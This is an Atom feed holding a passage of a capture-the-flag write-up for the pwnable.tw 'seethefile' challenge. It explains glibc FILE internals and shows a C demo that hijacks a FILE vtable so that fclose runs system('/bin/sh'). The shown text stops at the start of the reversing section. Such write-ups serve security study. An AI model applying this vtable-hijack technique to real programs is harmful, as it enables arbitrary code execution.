<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
	<title> - file-stream-oriented-programming</title>
	<link href="/tags/file-stream-oriented-programming/atom.xml" rel="self" type="application/atom+xml"/>
  <link href="/"/>
	<generator uri="https://www.getzola.org/">Zola</generator>
	<updated>2020-03-30T08:23:31.139+00:00</updated>
	<id>/tags/file-stream-oriented-programming/atom.xml</id>
	<entry xml:lang="en">
		<title>pwnable.tw - seethefile</title>
		<published>2020-03-29T01:23:36.608+00:00</published>
		<updated>2020-03-30T08:23:31.139+00:00</updated>
		<link href="/posts/pwnable-tw-seethefile/" type="text/html"/>
		<id>/posts/pwnable-tw-seethefile/</id>
		<content type="html">&lt;h1 id=&quot;challenge&quot;&gt;Challenge&lt;&#x2F;h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Can you see anything?&lt;&#x2F;p&gt;
&lt;p&gt;Get a shell for me.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;nc chall.pwnable.tw 10200&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;pwnable.tw&#x2F;static&#x2F;chall&#x2F;seethefile&quot;&gt;seethefile&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;pwnable.tw&#x2F;static&#x2F;libc&#x2F;libc_32.so.6&quot;&gt;libc.so&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;background&quot;&gt;Background&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;io-file-plus&quot;&gt;_IO_FILE_plus&lt;&#x2F;h2&gt;
&lt;p&gt;Files are internally represented using the &lt;a href=&quot;https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;glibc&#x2F;glibc-2.23&#x2F;source&#x2F;libio&#x2F;libioP.h#L342&quot;&gt;&lt;code&gt;_IO_FILE_plus&lt;&#x2F;code&gt;&lt;&#x2F;a&gt; struct in glibc:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;struct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_FILE_plus
{
  _IO_FILE file;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;const struct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_jump_t *vtable;
};
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;This struct is cast to an opaque &lt;code&gt;FILE&lt;&#x2F;code&gt; pointer and returned from &lt;code&gt;fopen&lt;&#x2F;code&gt;. &lt;&#x2F;p&gt;
&lt;h2 id=&quot;io-file&quot;&gt;_IO_FILE&lt;&#x2F;h2&gt;
&lt;p&gt;The &lt;a href=&quot;https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;glibc&#x2F;glibc-2.23&#x2F;source&#x2F;libio&#x2F;libio.h#L241&quot;&gt;&lt;code&gt;_IO_FILE&lt;&#x2F;code&gt;&lt;&#x2F;a&gt; struct contains buffered data and other details about a file:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;struct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_FILE {
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _flags;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* High-order word is _IO_MAGIC; rest is flags. *&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_file_flags _flags

  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* The following pointers correspond to the C++ streambuf protocol. *&#x2F;
  &#x2F;* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. *&#x2F;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_read_ptr;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Current read pointer *&#x2F;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_read_end;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* End of get area. *&#x2F;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_read_base;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Start of putback+get area. *&#x2F;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_write_base;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Start of put area. *&#x2F;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_write_ptr;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Current put pointer. *&#x2F;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_write_end;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* End of put area. *&#x2F;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_buf_base;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Start of reserve area. *&#x2F;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_buf_end;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* End of reserve area. *&#x2F;
  &#x2F;* The following fields are used to support backing up and undo. *&#x2F;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_save_base; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Pointer to start of non-current get area. *&#x2F;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_backup_base;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Pointer to first valid character of backup area *&#x2F;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_save_end; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Pointer to end of non-current get area. *&#x2F;

  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;struct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_marker *_markers;

  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_FILE *_chain;
  
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _fileno;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _flags2;
  _IO_off_t _old_offset; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* This used to be _offset but it&amp;#39;s too small.  *&#x2F;

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;__HAVE_COLUMN &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* temporary *&#x2F;
  &#x2F;* 1+column number of pbase(); 0 is unknown. *&#x2F;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;unsigned short&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _cur_column;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;signed char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _vtable_offset;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _shortbuf[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;];

  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;*  char* _save_gptr;  char* _save_egptr; *&#x2F;

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;  _IO_lock_t &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_lock;
};
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h2 id=&quot;io-jump-t-vtable&quot;&gt;_IO_jump_t (vtable)&lt;&#x2F;h2&gt;
&lt;p&gt;Even more interestingly, the &lt;code&gt;_IO_FILE_plus&lt;&#x2F;code&gt; struct contains a field named &lt;code&gt;vtable&lt;&#x2F;code&gt;. This field acts as a jump table 
containing virtual functions that are used when interacting with the file.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;struct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_jump_t
{
    JUMP_FIELD(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;size_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, __dummy);
    JUMP_FIELD(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;size_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* showmany *&#x2F;
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;For example, when &lt;code&gt;fclose(FILE *ptr)&lt;&#x2F;code&gt; is called, the function pointer stored in the &lt;code&gt;__finish&lt;&#x2F;code&gt;  field in the struct will 
be called after freeing internal structures. &lt;&#x2F;p&gt;
&lt;h2 id=&quot;attacking-files-file-stream-oriented-programming&quot;&gt;Attacking FILEs (File-Stream Oriented Programming)&lt;&#x2F;h2&gt;
&lt;p&gt;If we are able to call file-related functions (fclose, fread, etc.) on a pointer we can redirect execution by creating 
entries in the &lt;code&gt;vtable&lt;&#x2F;code&gt; field in &lt;code&gt;_IO_FILE_plus&lt;&#x2F;code&gt;. I created an example program to demonstrate an attack by creating a 
fake &lt;code&gt;FILE&lt;&#x2F;code&gt; struct:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; gcc -m32 test.c -o test

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;lt;stdio.h&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;lt;stdlib.h&amp;gt;

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; vtable[] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(size_t, __dummy);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(size_t, __dummy2);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_finish_t, __finish);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_overflow_t, __overflow);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_underflow_t, __underflow);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_underflow_t, __uflow);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_sync_t, __sync);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_read_t, __read);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_write_t, __write);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_seek_t, __seek);
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;    system,  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; JUMP_FIELD(_IO_close_t, __close);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_stat_t, __stat);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_imbue_t, __imbue);
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;};

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;argc, &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char** &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;argv) {
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; Creates a file and overwrites the vtable field in the FILE struct
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;    FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;fopen&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&#x2F;dev&#x2F;null&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;r&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;size_t &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;vtable_addr &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) fp) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ sizeof&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(FILE);

    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;vtable_addr &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;size_t &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)vtable;

    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; Moves &amp;quot;&#x2F;bin&#x2F;sh\x00&amp;quot; to the start of the file pointer.
    &#x2F;&#x2F; When system is called, it will interpret the FILE* as a char*, which
    &#x2F;&#x2F; means that the interpreted string will be &amp;quot;&#x2F;bin&#x2F;sh&amp;quot; due to the null byte.
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;strcpy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&#x2F;bin&#x2F;sh&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);

    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; Calls system with the FILE pointer as an argument. This should create
    &#x2F;&#x2F; a shell.
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;fclose&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp);

    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Running this test program gives us a shell and then segfaults:
&lt;img src=&quot;&#x2F;posts&#x2F;pwnable-tw-seethefile&#x2F;5e80319b0f5e61083b61b4a9.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;reversing&quot;&gt;Reversing&lt;&#x2F;h1&gt;
&lt;p&gt;Reversing the program is made easy by cross-referencing the program&#x27;s behavior with Ghidra.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;main&quot;&gt;main&lt;&#x2F;h2&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;argc,&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char **&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;argv){
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; input;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; input_str [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;];
  
  init();
  welcome();
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;do &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
    menu();
